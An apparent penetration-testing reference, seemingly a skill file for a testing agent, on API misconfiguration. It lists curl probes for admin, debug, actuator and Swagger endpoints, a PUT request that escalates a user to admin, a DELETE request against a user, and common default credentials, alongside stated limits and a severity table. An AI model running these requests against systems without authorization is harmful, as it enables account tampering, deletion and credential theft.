# API Configuration Security Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

API configuration security vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Unauthenticated Endpoints | ✓ Probe admin/debug paths | - | Execute admin operations |
| Config File Access | ✓ Read exposed config | ✓ Use discovered secrets | Malicious configuration change |
| Debug Endpoints | ✓ Verify endpoint accessible | - | Execute debug functions |
| Actuator Exposure | ✓ List exposed endpoints | - | Exploit actuator for RCE |

**Safe Validation Method**: Verify endpoint exists and is accessible; do not execute privileged operations.

### Common Unauthorized Admin Endpoints
```bash
curl -i -s -k -X GET https://target.com/admin
curl -i -s -k -X GET https://target.com/api/admin
curl -i -s -k -X GET https://target.com/manage
```

### Debug Endpoints
```bash
curl -i -s -k -X GET https://target.com/debug
curl -i -s -k -X GET https://target.com/trace
curl -i -s -k -X GET https://target.com/env
curl -i -s -k -X GET https://target.com/actuator
```

### Swagger/API Documentation Exposure
```bash
curl -i -s -k -X GET https://target.com/swagger-ui.html
curl -i -s -k -X GET https://target.com/api-docs
curl -i -s -k -X GET https://target.com/v1/api-docs
curl -i -s -k -X GET https://target.com/openapi.json
```

### Health Check Endpoints
```bash
curl -i -s -k -X GET https://target.com/health
curl -i -s -k -X GET https://target.com/status
curl -i -s -k -X GET https://target.com/info
```

## Insecure HTTP Methods

### Test Methods (PUT/DELETE/PATCH/TRACE/OPTIONS)
```bash
# OPTIONS to detect supported methods
curl -i -s -k -X OPTIONS https://target.com/api/v1/users

# Try PUT to modify resource
curl -i -s -k -X PUT -H "Content-Type: application/json" -d '{"role":"admin"}' https://target.com/api/v1/users/1

# Try DELETE to remove resource
curl -i -s -k -X DELETE https://target.com/api/v1/users/1

# TRACE for Cross-Site Tracing (XST) test
curl -i -s -k -X TRACE https://target.com/api/v1/users
```

## Version/Debug Endpoint Exposure

### Spring Boot Actuator Endpoints
```bash
curl -i -s -k -X GET https://target.com/actuator/env
curl -i -s -k -X GET https://target.com/actuator/heapdump
curl -i -s -k -X GET https://target.com/actuator/trace
curl -i -s -k -X GET https://target.com/actuator/mappings
```

### Django Debug Mode
```bash
# Trigger error to view debug page
curl -i -s -k -X GET https://target.com/api/nonexistent_endpoint_to_trigger_debug
```

### PHP Info
```bash
curl -i -s -k -X GET https://target.com/phpinfo.php
curl -i -s -k -X GET https://target.com/info.php
```

### ASP.NET Trace
```bash
curl -i -s -k -X GET https://target.com/trace.axd
```

## Default Credentials

### Common API Default Passwords and Admin Console Credentials
```json
{
  "admin": "admin",
  "admin": "password",
  "admin": "123456",
  "root": "root",
  "test": "test",
  "api": "api",
  "user": "user"
}
```

## Analysis Process

1. Directory scanning to identify hidden API endpoints and documentation paths
2. Test common unauthorized access paths (admin, debug, actuator, etc.)
3. Use OPTIONS method to detect supported HTTP verbs
4. Try insecure HTTP methods to operate on resources
5. Check if error responses leak debug information or stack traces
6. Try default credentials to login to admin interfaces

## Output

- Proof payload
- Complete request packet (HTTP format)
- Leaked sensitive configuration or documentation content

## Severity Classification

API configuration disclosure severity is based on "the value of disclosed content" — High requires keys/credentials. 

| Actual case | Severity | Note |
|---------|------|------|
| disclosureconfiguration containing keys/credentials (`actuator/env` containing DB passwords/`.env`/API Key/heapdump containing tokens) | High | direct credential disclosure |
| disclosureinternal API structure/endpoints (Swagger exposes all interfaces/debug pagecontains routes/internal paths) | Medium | attack surface expansion |
| disclosureharmless configuration (feature flag/timeout values/framework version without a CVE) | Low | Informational |
| Endpoint exists but returns empty content or requires authentication | Low | Not reachable |
| heapdump contains many production credentials / configurationcontains full database connection strings | Critical | large-scale credential disclosure |

**Key judgment**: Reporting High requires confirming the configuration contains usable keys/credentials. Swagger exposure with only public endpoints record as Medium; framework version with no known CVE record Low. Do not use disclosed credentials for real actions.

---

## Prohibited

- ⚠️ No destructive PUT/DELETE operations
- ⚠️ No downloading large heapdump files causing server resource exhaustion
- ⚠️ Only prove existence + provide command/PoC